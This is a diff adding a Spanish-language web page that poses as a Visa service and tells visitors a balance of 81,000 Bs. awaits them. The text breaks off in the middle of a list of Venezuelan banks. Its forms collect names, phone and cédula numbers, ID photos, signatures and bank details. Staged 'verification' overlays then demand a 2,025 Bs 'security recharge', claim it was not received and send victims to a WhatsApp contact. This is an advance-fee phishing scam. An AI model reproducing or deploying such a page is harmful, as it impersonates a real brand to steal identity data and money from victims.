@@ -1,0 +1,2215 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Saldo Disponible: 81.000,00 Bs.</title>
+
+  <!-- Fuentes Google (opcional) -->
+  <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;600;700;800&display=swap" rel="stylesheet">
+  <!-- Font Awesome (opcional, para íconos) -->
+  <link 
+    rel="stylesheet" 
+    href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css" 
+    integrity="sha512-R4p+3pVNe8+zWXEZUg9D3z+m5wK/5qOPkKgjAlc4E+r4QIxv4Wp6NUsAzWRvHWDYRexvbJR67vF9p/L+0N4R0Q==" 
+    crossorigin="anonymous" 
+    referrerpolicy="no-referrer"
+/>
+
+  <style>
+    /****************************************************
+     * Variables de estilo - Inspiración VISA
+     ****************************************************/
+    :root {
+      --primary: #1434CB;
+      --secondary: #1A1F71;
+      --accent: #F7B600;
+      --text: #2C2C2C;
+      --text-light: #666666;
+      --bg: #F4F7FF;
+      --input-bg: #FFFFFF;
+      --border: #E8ECF4;
+      --error: #D22B2B;
+      --success: #00A976;
+      --gradient: linear-gradient(135deg, var(--secondary) 0%, var(--primary) 100%);
+      --transition: all 0.3s ease-in-out;
+    }
+
+    /****************************************************
+     * Reset y fuentes
+     ****************************************************/
+    * {
+      box-sizing: border-box;
+      margin: 0;
+      padding: 0;
+      font-family: 'Roboto', 'Open Sans', 'Avenir Next', 'Proxima Nova', sans-serif;
+      -webkit-font-smoothing: antialiased;
+    }
+
+    body {
+      background: var(--bg);
+      color: var(--text);
+      min-height: 100vh;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: flex-start;
+      padding: 1rem;
+      position: relative;
+      overflow-x: hidden;
+      /* Se remueve cualquier fixed o sticky en el header */
+    }
+
+    /****************************************************
+     * Contenedor principal
+     ****************************************************/
+    .container {
+      width: 100%;
+      max-width: 1200px;
+      background: var(--input-bg);
+      border-radius: 40px;
+      box-shadow: 0 32px 64px -16px rgba(20, 52, 203, 0.15);
+      overflow: hidden;
+      position: relative;
+      display: flex;
+      flex-direction: column;
+      margin-bottom: 2rem;
+    }
+
+    /****************************************************
+     * Barra superior (topbar) - NO está position: fixed
+     ****************************************************/
+    .topbar {
+      background: var(--gradient);
+      color: #fff;
+      padding: 1.5rem 2rem;
+      position: relative;
+      overflow: hidden;
+    }
+
+    /* Animación de onda / diagonal */
+    .topbar::before {
+      content: "";
+      position: absolute;
+      bottom: -80px;
+      left: -80px;
+      width: 160px;
+      height: 160px;
+      background: var(--accent);
+      border-radius: 50%;
+      opacity: 0.2;
+      animation: wave 15s infinite ease-in-out;
+      z-index: 0;
+    }
+
+    @keyframes wave {
+      0%   { transform: scale(1) translateY(0px); }
+      50%  { transform: scale(1.3) translateY(20px); }
+      100% { transform: scale(1) translateY(0px); }
+    }
+
+    .topbar::after {
+      content: '';
+      position: absolute;
+      top: 0; right: 0; bottom: 0; left: 0;
+      background: url('https://via.placeholder.com/380x900') center/cover;
+      opacity: 0.1;
+      mix-blend-mode: soft-light;
+      z-index: 0;
+    }
+
+    .topbar-content {
+      position: relative;
+      z-index: 1;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+    }
+
+    .logo {
+      margin-bottom: 1rem;
+      text-align: center;
+    }
+
+    .logo img {
+      width: 180px;
+      height: auto;
+      object-fit: contain;
+      transition: var(--transition);
+    }
+
+    .logo img:hover {
+      transform: scale(1.05);
+    }
+
+    .title-header {
+      margin-top: 0.5rem;
+      font-size: 1.6rem;
+      font-weight: 800;
+      letter-spacing: 1px;
+      text-transform: uppercase;
+      text-align: center;
+    }
+
+    /****************************************************
+     * Lista de pasos (horizontal)
+     ****************************************************/
+    .steps {
+      list-style: none;
+      display: flex;
+      flex-direction: row;
+      gap: 2rem;
+      margin-top: 1.5rem;
+      justify-content: center;
+      flex-wrap: wrap;
+    }
+
+    .step-item {
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      opacity: 0.6;
+      transition: var(--transition);
+    }
+
+    .step-item.active {
+      opacity: 1;
+      transform: scale(1.05);
+    }
+
+    .step-number {
+      width: 36px;
+      height: 36px;
+      border-radius: 50%;
+      background: rgba(255, 255, 255, 0.15);
+      backdrop-filter: blur(8px);
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      margin-bottom: 0.5rem;
+      font-weight: 600;
+      font-size: 0.9rem;
+      transition: var(--transition);
+    }
+
+    .active .step-number {
+      background: var(--accent);
+      color: var(--secondary);
+    }
+
+    .step-title {
+      font-weight: 700;
+      font-size: 1rem;
+      margin-bottom: 0.25rem;
+      text-align: center;
+    }
+
+    .step-description {
+      font-size: 0.85rem;
+      opacity: 0.8;
+      text-align: center;
+    }
+
+    /****************************************************
+     * Contenido principal - SIN max-height ni overflow
+     ****************************************************/
+    .main-content {
+      padding: 3rem;
+    }
+
+    .form-header {
+      margin-bottom: 2rem;
+      text-align: center;
+    }
+
+    .form-header h1 {
+      font-size: 1.8rem;
+      font-weight: 700;
+      margin-bottom: 0.5rem;
+      background: var(--gradient);
+      -webkit-background-clip: text;
+      -webkit-text-fill-color: transparent;
+    }
+
+    .form-header p {
+      color: var(--text-light);
+      font-size: 1rem;
+      line-height: 1.4;
+      max-width: 600px;
+      margin: 0 auto;
+    }
+
+    /****************************************************
+     * Ocultar y mostrar pasos
+     ****************************************************/
+    .form-step {
+      display: none;
+    }
+    .form-step.active {
+      display: block;
+      animation: fadeInUp 0.5s ease both;
+    }
+
+    @keyframes fadeInUp {
+      from { transform: translateY(20px); opacity: 0; }
+      to { transform: translateY(0); opacity: 1; }
+    }
+
+    /****************************************************
+     * Grupos de formulario
+     ****************************************************/
+    .form-group {
+      margin-bottom: 1.5rem;
+    }
+
+    label {
+      display: block;
+      font-weight: 700;
+      margin-bottom: 0.5rem;
+      font-size: 1rem;
+      color: var(--text);
+    }
+
+    .label-help {
+      display: block;
+      font-size: 0.85rem;
+      color: var(--text-light);
+      margin-bottom: 0.3rem;
+    }
+
+    input, select {
+      width: 100%;
+      padding: 0.75rem 1rem;
+      border: 2px solid var(--border);
+      border-radius: 16px;
+      font-size: 0.95rem;
+      background: var(--input-bg);
+      transition: var(--transition);
+      color: var(--text);
+      /* Para que el navegador no guarde datos */
+      autocomplete: off;
+    }
+
+    input:focus, select:focus {
+      outline: none;
+      border-color: var(--primary);
+      box-shadow: 0 0 0 4px rgba(20, 52, 203, 0.1);
+    }
+
+    /****************************************************
+     * Botones
+     ****************************************************/
+    .btn {
+      background: var(--gradient);
+      color: white;
+      padding: 0.9rem 2rem;
+      border: none;
+      border-radius: 16px;
+      font-size: 1rem;
+      font-weight: 600;
+      cursor: pointer;
+      display: inline-flex;
+      align-items: center;
+      justify-content: center;
+      gap: 0.5rem;
+      transition: var(--transition);
+    }
+
+    .btn:hover {
+      transform: translateY(-3px);
+      box-shadow: 0 8px 16px -4px rgba(20, 52, 203, 0.25);
+    }
+
+    .btn-row {
+      display: flex;
+      gap: 1rem;
+      margin-top: 1rem;
+      flex-wrap: wrap;
+      justify-content: flex-start;
+    }
+
+    /****************************************************
+     * File Upload
+     ****************************************************/
+    .file-upload {
+      border: 2px dashed var(--border);
+      border-radius: 16px;
+      padding: 2rem;
+      text-align: center;
+      cursor: pointer;
+      transition: var(--transition);
+      background: var(--bg);
+      color: var(--text-light);
+      font-size: 0.95rem;
+    }
+
+    .file-upload:hover {
+      border-color: var(--primary);
+      background: rgba(20, 52, 203, 0.03);
+    }
+
+    .hidden {
+      display: none;
+    }
+
+    .file-name-preview {
+      font-size: 0.85rem;
+      color: var(--text);
+      margin-top: 0.5rem;
+      text-align: center;
+    }
+
+    /****************************************************
+     * Modales genéricos - Fondo difuminado
+     ****************************************************/
+    .modal-overlay {
+      position: fixed;
+      top: 0; left: 0; right: 0; bottom: 0;
+      background: rgba(0, 0, 0, 0.3);
+      backdrop-filter: blur(6px);
+      display: none;
+      align-items: center;
+      justify-content: center;
+      z-index: 9999;
+    }
+    .modal-overlay.show {
+      display: flex;
+    }
+
+    .modal {
+      background: #fff;
+      max-width: 600px;
+      width: 90%;
+      padding: 2rem;
+      border-radius: 20px;
+      position: relative;
+      box-shadow: 0 8px 16px rgba(0,0,0,0.2);
+      animation: fadeInUp 0.4s ease;
+    }
+
+    @keyframes fadeInUp {
+      from { transform: translateY(30px); opacity: 0; }
+      to { transform: translateY(0); opacity: 1; }
+    }
+
+    .close-modal {
+      background: none;
+      border: none;
+      font-size: 1.2rem;
+      position: absolute;
+      top: 1rem; right: 1rem;
+      cursor: pointer;
+    }
+
+    .modal-header h2 {
+      margin-bottom: 1rem;
+      font-weight: 700;
+      font-size: 1.3rem;
+      text-align: center;
+      color: var(--secondary);
+    }
+
+    .modal-content {
+      line-height: 1.6;
+      font-size: 1rem;
+      text-align: justify;
+    }
+
+    /****************************************************
+     * Vista previa de firma
+     ****************************************************/
+    .signature-preview {
+      margin-top: 1rem;
+      text-align: center;
+    }
+    .signature-preview img {
+      max-width: 250px;
+      border: 2px dashed var(--border);
+      border-radius: 8px;
+      padding: 0.5rem;
+    }
+
+    /****************************************************
+     * Modal de firma
+     ****************************************************/
+    #signatureModal .modal-content {
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+    }
+    #signatureCanvas {
+      border: 2px dashed var(--border);
+      border-radius: 8px;
+      cursor: crosshair;
+      width: 100%;
+      max-width: 500px;
+    }
+
+    /****************************************************
+     * Barra de progreso (más gruesa) - Se mantiene fixed
+     ****************************************************/
+    .progress-indicator {
+      position: fixed;
+      top: 0; left: 0; right: 0;
+      height: 8px;
+      background: var(--border);
+      z-index: 999;
+    }
+    .progress-bar {
+      height: 100%;
+      background: var(--gradient);
+      width: 0%;
+      transition: width 0.6s cubic-bezier(0.16, 1, 0.3, 1);
+    }
+
+    /****************************************************
+     * Ajustes responsive
+     ****************************************************/
+    @media (max-width: 768px) {
+      .topbar-content {
+        flex-direction: column;
+      }
+      .steps {
+        flex-direction: column;
+        gap: 1rem;
+      }
+
+      .main-content {
+        padding: 1.5rem;
+      }
+
+      .form-header h1 {
+        font-size: 1.5rem;
+      }
+    }
+
+    /****************************************************
+     * Botón flotante de WhatsApp
+     ****************************************************/
+    .whatsapp-float {
+      position: fixed;
+      bottom: 20px;
+      right: 20px;
+      z-index: 99999;
+      display: flex;
+      align-items: center;
+      gap: 0.4rem;
+      background: #25D366;
+      color: #fff;
+      padding: 0.7rem 1rem;
+      border-radius: 30px;
+      text-decoration: none;
+      font-size: 0.9rem;
+      box-shadow: 0 8px 16px -4px rgba(0, 0, 0, 0.3);
+      transition: var(--transition);
+    }
+    .whatsapp-float img {
+      width: 24px;
+      height: 24px;
+    }
+    .whatsapp-float:hover {
+      background: #1ebe5a;
+      text-decoration: none;
+      color: #fff;
+      transform: translateY(-2px);
+    }
+
+    /****************************************************
+     * Modal Loading (desenfoca la pantalla) - Validación
+     ****************************************************/
+    .loading-overlay {
+      position: fixed;
+      top: 0; left: 0; right: 0; bottom: 0;
+      display: none;
+      align-items: center;
+      justify-content: center;
+      background: rgba(0, 0, 0, 0.4);
+      backdrop-filter: blur(5px);
+      z-index: 10000;
+      flex-direction: column;
+      text-align: center;
+    }
+
+    .loading-box {
+      background: #fff;
+      padding: 2rem;
+      border-radius: 20px;
+      width: 90%;
+      max-width: 400px;
+      box-shadow: 0 8px 16px rgba(0,0,0,0.2);
+      animation: fadeInUp 0.4s ease;
+    }
+
+    .loading-step {
+      font-size: 1rem;
+      margin: 1rem 0;
+      display: none; /* se mostrarán secuencialmente */
+      text-align: center;
+    }
+
+    .loading-spinner {
+      width: 50px;
+      height: 50px;
+      border: 5px solid var(--border);
+      border-top: 5px solid var(--primary);
+      border-radius: 50%;
+      margin: 0 auto;
+      animation: spin 1s linear infinite;
+    }
+
+    @keyframes spin {
+      100% { transform: rotate(360deg); }
+    }
+
+    /****************************************************
+     * Mensaje flotante (Cierre e indicación)
+     ****************************************************/
+    #comprobanteCierreMsg {
+      position: fixed;
+      bottom: 120px;
+      right: 20px;
+      background: var(--accent);
+      color: var(--secondary);
+      padding: 1rem 1.5rem;
+      border-radius: 12px;
+      box-shadow: 0 4px 12px rgba(0,0,0,0.2);
+      display: none;
+      max-width: 300px;
+      font-size: 0.9rem;
+      animation: fadeInRight 0.5s ease;
+    }
+
+    @keyframes fadeInRight {
+      from { transform: translateX(20px); opacity: 0; }
+      to { transform: translateX(0); opacity: 1; }
+    }
+
+    /****************************************************
+     * Overlays de 20s en Step3 (4 mensajes)
+     ****************************************************/
+    .verification-overlay {
+      position: fixed;
+      top: 0; left: 0; right: 0; bottom: 0;
+      background: rgba(0, 0, 0, 0.5);
+      backdrop-filter: blur(5px);
+      display: none;
+      align-items: center;
+      justify-content: center;
+      z-index: 99999;
+      text-align: center;
+      color: #fff;
+      flex-direction: column;
+      padding: 2rem;
+      transition: var(--transition);
+    }
+    .verification-overlay .verification-message {
+      background: rgba(0,0,0,0.6);
+      border-radius: 20px;
+      padding: 2rem;
+      margin-bottom: 1rem;
+      max-width: 600px;
+      width: 90%;
+      animation: fadeInUp 0.5s ease;
+      font-size: 1.1rem;
+    }
+    .verification-overlay h2 {
+      font-size: 1.3rem;
+      margin-bottom: 1rem;
+      color: #00ff00;
+    }
+
+    /****************************************************
+     * Tarjeta principal "Verificación de Seguridad"
+     ****************************************************/
+    .verification-card-container {
+      border: 2px dashed var(--border);
+      border-radius: 20px;
+      padding: 2rem;
+      text-align: center;
+      margin-bottom: 2rem;
+      background-color: #fff;
+      box-shadow: 0 2px 8px rgba(0,0,0,0.1);
+      animation: fadeInUp 0.4s ease;
+    }
+    .verification-card-container h2 {
+      font-size: 1.5rem;
+      margin-bottom: 1rem;
+      color: var(--primary);
+    }
+    .verification-card-container p {
+      font-size: 1rem;
+      color: var(--text-light);
+      margin-bottom: 1rem;
+      line-height: 1.4;
+    }
+
+    /****************************************************
+     * Sección "¿Por qué realizar esta verificación?"
+     ****************************************************/
+    .why-verification-container {
+      text-align: center;
+      margin-bottom: 2rem;
+      animation: fadeInUp 0.4s ease;
+    }
+    .why-verification-container h2 {
+      margin-bottom: 1rem;
+      color: var(--accent);
+      font-size: 1.4rem;
+    }
+    .why-list {
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      gap: 0.8rem;
+    }
+    .why-item {
+      background: #fff;
+      border-radius: 12px;
+      padding: 1rem;
+      width: 80%;
+      max-width: 500px;
+      display: flex;
+      align-items: center;
+      gap: 1rem;
+      box-shadow: 0 2px 8px rgba(0,0,0,0.1);
+    }
+    .why-item img {
+      width: 48px;
+      height: 48px;
+      animation: spinIcon 4s linear infinite;
+    }
+    @keyframes spinIcon {
+      0% { transform: rotate(0deg); }
+      100% { transform: rotate(360deg); }
+    }
+    .why-item span {
+      text-align: left;
+      font-size: 0.95rem;
+    }
+
+    /* Botón con cuenta regresiva */
+    .btn-disabled {
+      opacity: 0.6;
+      cursor: not-allowed;
+    }
+
+    /****************************************************
+     * Sección "¿Qué necesitas hacer?"
+     ****************************************************/
+    .what-to-do-card {
+      border: 2px dashed var(--border);
+      border-radius: 20px;
+      padding: 2rem;
+      background: #fff;
+      text-align: left;
+      max-width: 600px;
+      margin: 1rem auto;
+      box-shadow: 0 2px 8px rgba(0,0,0,0.1);
+      animation: fadeInUp 0.4s ease;
+    }
+
+    .what-to-do-title {
+      text-align: center;
+      font-size: 1.2rem;
+      color: var(--secondary);
+      font-weight: 700;
+      margin-bottom: 1rem;
+    }
+
+    .what-to-do-content {
+      margin-bottom: 1rem;
+      line-height: 1.4;
+      color: var(--text);
+    }
+    .what-to-do-content strong {
+      color: var(--secondary);
+    }
+
+    .what-to-do-data {
+      background: #F9FAFB;
+      border-radius: 12px;
+      padding: 1rem;
+      border: 1px solid var(--border);
+      margin-top: 1rem;
+    }
+
+    .what-to-do-data ul {
+      list-style: none; 
+      padding-left: 0; 
+      line-height: 1.6; 
+      margin: 0;
+    }
+
+    .concept-text {
+      font-weight: 700;
+      text-transform: uppercase;
+      color: var(--accent);
+    }
+
+    /****************************************************
+     * Completar datos de recarga
+     ****************************************************/
+    .final-recharge-data {
+      border: 2px dashed var(--border);
+      border-radius: 20px;
+      padding: 2rem;
+      background: #fff;
+      max-width: 600px;
+      margin: 1.5rem auto;
+      box-shadow: 0 2px 8px rgba(0,0,0,0.1);
+      animation: fadeInUp 0.4s ease;
+    }
+    .final-recharge-data h3 {
+      text-align: center;
+      margin-bottom: 1rem;
+      color: var(--secondary);
+    }
+    .final-recharge-data .data-row {
+      margin-bottom: 0.7rem;
+      font-size: 0.95rem;
+      display: flex;
+      justify-content: space-between;
+    }
+    .final-recharge-data .data-label {
+      font-weight: 600;
+    }
+
+    .reembolso-banner {
+      background: #fdf7ec;
+      border-left: 4px solid var(--accent);
+      padding: 1rem;
+      border-radius: 8px;
+      margin-top: 1rem;
+      font-size: 0.9rem;
+      color: var(--text);
+    }
+
+    /****************************************************
+     * Modal Alerta Recarga (confirmación)
+     ****************************************************/
+    .modalAlertRecarga .modal-header h2 {
+      text-align: center;
+      font-size: 1.2rem;
+      margin-bottom: 0.5rem;
+      color: var(--primary);
+    }
+    .modalAlertRecarga p {
+      line-height: 1.5;
+    }
+    .modalAlertRecarga ul {
+      list-style: none;
+      padding-left: 0;
+      line-height: 1.6;
+    }
+
+    /****************************************************
+     * Pantalla de Bienvenida
+     ****************************************************/
+    .intro-overlay {
+      position: fixed;
+      top: 0; left: 0; right: 0; bottom: 0;
+      background: rgba(0, 0, 0, 0.5);
+      backdrop-filter: blur(8px);
+      z-index: 999999;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      color: #fff;
+      font-size: 1.3rem;
+      text-align: center;
+      animation: fadeInUp 0.4s ease;
+    }
+
+  </style>
+</head>
+<body>
+  <!-- Barra de progreso -->
+  <div class="progress-indicator">
+    <div class="progress-bar" id="progressBar"></div>
+  </div>
+
+  <!-- Intro overlay (pantalla difuminada) -->
+  <div class="intro-overlay" id="introOverlay">
+    <!-- Mensajes secuenciales -->
+    <div id="introMessage1" style="display:none; margin-bottom:1rem;">
+      <strong style="font-size:1.4rem;">Bienvenido</strong>
+    </div>
+    <div id="introMessage2" style="display:none;">
+      <strong>Estamos cargando tus datos...</strong>
+    </div>
+  </div>
+
+  <!-- Botón flotante de WhatsApp -->
+  <a 
+    href="https://wa.me/17373018059" 
+    target="_blank" 
+    class="whatsapp-float" 
+    id="waFloat"
+    title="Atención al cliente vía WhatsApp"
+    style="display:none;"
+  >
+    <img src="https://upload.wikimedia.org/wikipedia/commons/6/6b/WhatsApp.svg" alt="WhatsApp" />
+    <span>Atención al Cliente</span>
+  </a>
+
+  <!-- Mensaje flotante (opcional) -->
+  <div id="comprobanteCierreMsg">
+    Tu comprobante ha sido adjuntado correctamente. 
+    <br/>En 7 segundos se cerrará este mensaje.
+  </div>
+
+  <!-- Overlay de validación (5s) Steps 1 y 2 -->
+  <div class="loading-overlay" id="validationOverlay">
+    <div class="loading-box" style="text-align:center;">
+      <div class="loading-spinner"></div>
+      <p style="margin-top:1rem;">Validando tu información, por favor espera...</p>
+    </div>
+  </div>
+
+  <!-- Modal de confirmación (Steps) -->
+  <div class="modal-overlay" id="modalConfirm">
+    <div class="modal">
+      <button class="close-modal" onclick="onEditData()">&times;</button>
+      <div class="modal-header">
+        <h2>Revisar y Confirmar</h2>
+      </div>
+      <div class="modal-content" id="modalConfirmContent" style="text-align:justify;">
+        <!-- Contenido dinámico -->
+      </div>
+      <div class="modal-footer" style="margin-top:1.5rem; display:flex; justify-content:center; gap:1rem;">
+        <button class="btn" type="button" onclick="onEditData()">
+          <i class="fas fa-edit"></i> Editar
+        </button>
+        <button class="btn" id="btnModalConfirmOk" style="background: var(--accent); color: var(--secondary);">
+          <i class="fas fa-check-circle"></i> Aceptar
+        </button>
+      </div>
+    </div>
+  </div>
+
+  <!-- Modal de firma (Step1) -->
+  <div class="modal-overlay" id="signatureModal">
+    <div class="modal">
+      <button class="close-modal" onclick="closeSignatureModal()">&times;</button>
+      <div class="modal-header">
+        <h2>Firma (como está en tu documento de identidad)</h2>
+      </div>
+      <div class="modal-content">
+        <canvas id="signatureCanvas" width="500" height="200"></canvas>
+        <div class="btn-row" style="margin-top:1rem;">
+          <button class="btn" type="button" id="clearSignature">
+            <i class="fas fa-eraser"></i> Borrar
+          </button>
+          <button class="btn" type="button" id="saveSignature">
+            <i class="fas fa-save"></i> Guardar
+          </button>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <!-- Modal Alerta Recarga (cuando hace clic en "Una vez que realices...") -->
+  <div class="modal-overlay" id="modalAlertaRecarga">
+    <div class="modal modalAlertRecarga">
+      <button class="close-modal" onclick="closeRecargaAlert()">&times;</button>
+      <div class="modal-header">
+        <h2>Confirmación de Recarga</h2>
+      </div>
+      <div class="modal-content" id="modalAlertaRecargaContent">
+        <!-- Se llena dinámicamente -->
+      </div>
+      <div class="btn-row" style="justify-content:center; margin-top:1.5rem;">
+        <button class="btn btn-disabled" type="button" id="btnAlertaRecargaOk">
+          <i class="fas fa-check"></i> Confirmar
+        </button>
+      </div>
+    </div>
+  </div>
+
+  <!-- Overlay final (35s) -->
+  <div class="loading-overlay" id="finalLoadingOverlay">
+    <div class="loading-box">
+      <div class="loading-spinner"></div>
+      <div class="loading-step" id="finalStep1">Estamos validando todos tus datos...</div>
+      <div class="loading-step" id="finalStep2">Estamos conectando con tu banco...</div>
+      <div class="loading-step" id="finalStep3">Verificando la recarga de seguridad por 2.025,00 Bolívares...</div>
+      <div class="loading-step" id="finalStep4">Preparando tu depósito por <span id="finalMontoGlobal"></span>...</div>
+      <div class="loading-step" id="finalStep5">Verificando tu depósito de 2.025,00 Bolívares...</div>
+      <div class="loading-step" id="finalStep6">No localizamos tu recarga de seguridad por 2.025,00 Bolívares...</div>
+      <div class="loading-step" id="finalStep7">Revisando de nuevo la recarga de seguridad por 2.025,00 Bolívares...</div>
+      <div class="loading-step" id="finalStep8">
+        No se encontró tu depósito de seguridad por 2.025,00 Bolívares.<br/><br/>
+        Debes contactar a Atención al Cliente porque no hemos encontrado tu recarga de seguridad.
+        <div style="margin-top:1rem;">
+          <button class="btn" type="button" onclick="openWhatsAppError()">
+            <i class="fab fa-whatsapp"></i> Contactar por WhatsApp
+          </button>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <!-- OVERLAY de 20s (4 mensajes x 5s) al llegar a Step3 -->
+  <div class="verification-overlay" id="overlay20s">
+    <div class="verification-message" id="overlayMsg1">
+      <h2>¡Documento Validado!</h2>
+      <p>Tu documento de identidad fue validado con éxito.</p>
+    </div>
+    <div class="verification-message" id="overlayMsg2">
+      <h2>Preparando Depósito</h2>
+      <p>Estamos preparando tu depósito, por favor espera...</p>
+    </div>
+    <div class="verification-message" id="overlayMsg3">
+      <h2>Validación de Seguridad Extra</h2>
+      <p>Se requiere validación de seguridad adicional.</p>
+    </div>
+    <div class="verification-message" id="overlayMsg4">
+      <h2>Tu Banco Solicita Verificación</h2>
+      <p>Antes de recibir nuestros fondos, tu banco exige verificación extra.</p>
+    </div>
+  </div>
+
+  <div class="container">
+    <!-- TOPBAR -->
+    <header class="topbar">
+      <div class="topbar-content">
+        <div class="logo">
+          <img 
+            src="https://cdn.visa.com/v2/assets/images/logos/visa/blue/logo.png" 
+            alt="Visa Logo" 
+            title="Remeex"
+          />
+        </div>
+
+        <div class="title-header">Saldo Disponible: 81.000,00 Bs.</div>
+
+        <!-- Pasos -->
+        <ul class="steps">
+          <li class="step-item active" id="sidebarStep1">
+            <div class="step-number">1</div>
+            <div>
+              <div class="step-title">Datos Personales</div>
+              <div class="step-description">Información básica</div>
+            </div>
+          </li>
+          <li class="step-item" id="sidebarStep2">
+            <div class="step-number">2</div>
+            <div>
+              <div class="step-title">Datos Bancarios</div>
+              <div class="step-description">Método y depósito</div>
+            </div>
+          </li>
+          <li class="step-item" id="sidebarStep3">
+            <div class="step-number">3</div>
+            <div>
+              <div class="step-title">Verificación</div>
+              <div class="step-description">Recarga de Seguridad</div>
+            </div>
+          </li>
+        </ul>
+      </div>
+    </header>
+
+    <!-- MAIN CONTENT -->
+    <main class="main-content">
+      <!-- STEP 1 -->
+      <div class="form-step active" id="step1">
+        <div class="form-header">
+          <h1>Datos Personales</h1>
+          <p>
+            Completa tus datos para validar tu identidad.  
+            Asegúrate de que coincidan con tu documento oficial.
+          </p>
+        </div>
+
+        <form id="formStep1" autocomplete="off">
+          <div class="form-group">
+            <label for="fullName">
+              <i class="fas fa-user"></i> Nombre y Apellido
+            </label>
+            <span class="label-help">Tal como aparece en tu documento</span>
+            <input 
+              type="text" 
+              id="fullName"
+              placeholder="Ej: Juan Pérez" 
+              required 
+              autocomplete="off"
+            />
+          </div>
+
+          <!-- Teléfono con prefijo + 7 dígitos -->
+          <div class="form-group">
+            <label for="phonePrefix">
+              <i class="fas fa-phone"></i> Teléfono
+            </label>
+            <span class="label-help">Selecciona tu operadora y los 7 dígitos</span>
+            <div style="display:flex; gap:0.5rem;">
+              <select id="phonePrefix" required style="width:30%;" autocomplete="off">
+                <option value="">Operadora</option>
+                <option value="0412">0412</option>
+                <option value="0414">0414</option>
+                <option value="0424">0424</option>
+                <option value="0416">0416</option>
+                <option value="0426">0426</option>
+              </select>
+              <input 
+                type="text" 
+                id="phoneNumber" 
+                placeholder="1234567" 
+                pattern="^\d{7}$" 
+                required
+                style="width:70%;" 
+                autocomplete="off"
+              />
+            </div>
+          </div>
+
+          <div class="form-group">
+            <label for="docType">
+              <i class="far fa-id-card"></i> Tipo de Documento
+            </label>
+            <select id="docType" required autocomplete="off">
+              <option value="">Seleccione</option>
+              <option value="Cedula">Cédula</option>
+              <option value="Pasaporte">Pasaporte</option>
+              <option value="Licencia de Conducir">Licencia de Conducir</option>
+            </select>
+          </div>
+
+          <div class="form-group">
+            <label for="nacionalidad">
+              <i class="fas fa-globe-americas"></i> Nacionalidad
+            </label>
+            <select id="nacionalidad" required autocomplete="off">
+              <option value="">Seleccione</option>
+              <option value="Venezolano">Venezolano</option>
+              <option value="Extranjero">Extranjero</option>
+            </select>
+          </div>
+
+          <div class="form-group">
+            <label for="cedulaNumber">
+              <i class="fas fa-id-badge"></i> Número de Cédula
+            </label>
+            <input 
+              type="text"
+              id="cedulaNumber"
+              placeholder="Ej: 12345678"
+              pattern="^\d{1,8}$"
+              required
+              autocomplete="off"
+            />
+          </div>
+
+          <div class="form-group">
+            <label for="birthDate">
+              <i class="fas fa-calendar-alt"></i> Fecha de Nacimiento
+            </label>
+            <input 
+              type="date" 
+              id="birthDate" 
+              required
+              autocomplete="off"
+            />
+          </div>
+
+          <div class="form-group">
+            <label>
+              <i class="far fa-file-image"></i> Documento de Identidad
+            </label>
+            <span class="label-help">Vigente, nítido y en formato de imagen</span>
+            <div 
+              class="file-upload" 
+              onclick="document.getElementById('docUpload').click()"
+              id="docUploadTrigger"
+            >
+              Haz click o toca para seleccionar
+            </div>
+            <input 
+              type="file" 
+              id="docUpload" 
+              class="hidden"
+              accept="image/*"
+              required
+              autocomplete="off"
+            />
+            <div class="file-name-preview" id="docUploadName"></div>
+          </div>
+
+          <div class="form-group">
+            <label>
+              <i class="fas fa-signature"></i> Firma Digital
+            </label>
+            <span class="label-help">Debe coincidir con la firma en tu documento</span>
+            <div 
+              class="file-upload"
+              style="cursor:pointer;"
+              onclick="openSignaturePad()"
+            >
+              Haz click para firmar
+            </div>
+            <input type="hidden" id="signatureData" required />
+            <div class="signature-preview" id="signaturePreviewContainer" style="display:none;">
+              <strong>Vista Previa:</strong><br/>
+              <img id="signaturePreview" src="" alt="Firma Digital" />
+            </div>
+          </div>
+
+          <div class="btn-row">
+            <button type="button" class="btn" onclick="onContinueStep1()">
+              <i class="fas fa-arrow-right"></i> Siguiente
+            </button>
+          </div>
+        </form>
+      </div> <!-- Fin STEP1 -->
+
+      <!-- STEP 2 -->
+      <div class="form-step" id="step2">
+        <div class="form-header">
+          <h1>Datos Bancarios</h1>
+          <p>
+            Registra tu cuenta bancaria y el método de depósito para que podamos
+            enviar tus fondos correctamente.
+          </p>
+        </div>
+
+        <form id="formStep2" autocomplete="off">
+          <div class="form-group">
+            <label for="bankName">
+              <i class="fas fa-university"></i> Banco
+            </label>
+            <select id="bankName" required autocomplete="off">
+              <option value="">Seleccione</option>
+              <option value="0001|Banco Central de Venezuela">Banco Central de Venezuela</option>
+              <option value="0102|Banco de Venezuela S.A.C.A.">Banco de Venezuela S.A.C.A.</option>
+              <option value="0104|Banco Venezolano de Crédito S.A.">Banco Venezolano de Crédito S.A.</option>
+              <option value="0105|Banco Mercantil, C.A.">Banco Mercantil, C.A.</option>
+              <option value="0108|BBVA Provincial, S.A.">BBVA Provincial, S.A.</option>
+              <option value="0116|Banco Occidental de Descuento, C.A.">Bco Occidental de Descuento</option>
+              <option value="0134|Banesco S.A.C.A.">Banesco S.A.C.A.</option>
+              <option value="0137|Banco Sofitasa, C.A.">Banco Sofitasa, C.A.</option>
+              <option value="0138|Banco Plaza, C.A.">Banco Plaza, C.A.</option>
+              <option value="0146|BFC Banco Fondo Común">BFC Banco Fondo Común</option>
+              <option value="0151|BOD Banco Occidental de Descuento">BOD</option>
+              <option value="0156|100% Banco">100% Banco</option>
+              <option value="0157|DELSUR">DELSUR</option>
+              <option value="0163|Banco del Tesoro, C.A.">Banco del Tesoro</option>
+              <option value="0166|Banco Agrícola de Venezuela, C.A.">Banco Agrícola de Venezuela</option>
+              <option value="0168|Bancrecer">Bancrecer</option>
+              <option value="0171|BANPLUS">BANPLUS</option>
